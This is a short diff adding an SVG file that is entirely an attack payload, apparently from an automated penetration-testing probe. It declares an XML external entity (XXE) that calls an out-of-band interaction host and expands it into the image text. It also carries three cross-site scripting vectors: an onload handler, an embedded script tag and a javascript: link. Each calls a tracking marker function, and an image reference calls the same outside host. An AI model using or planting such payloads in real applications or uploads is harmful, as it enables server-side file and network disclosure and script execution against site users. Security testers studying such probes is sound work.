@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://PEN-NZUY-4251-6754.dns.collabp-reg1.devops.aws.dev/svg-xxe">]>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" onload="window.__forgeXssHit('FORGE_XSS_1059583215a6e0e14e669324e3a6a343')">
+  <script type="text/javascript">window.__forgeXssHit('FORGE_XSS_1059583215a6e0e14e669324e3a6a343')</script>
+  <a xlink:href="javascript:window.__forgeXssHit('FORGE_XSS_1059583215a6e0e14e669324e3a6a343')"><text y="20">x</text></a>
+  <image href="http://PEN-NZUY-4251-6754.dns.collabp-reg1.devops.aws.dev/svg-image.png" width="10" height="10"/>
+  <text y="60">&xxe;</text>
+</svg>
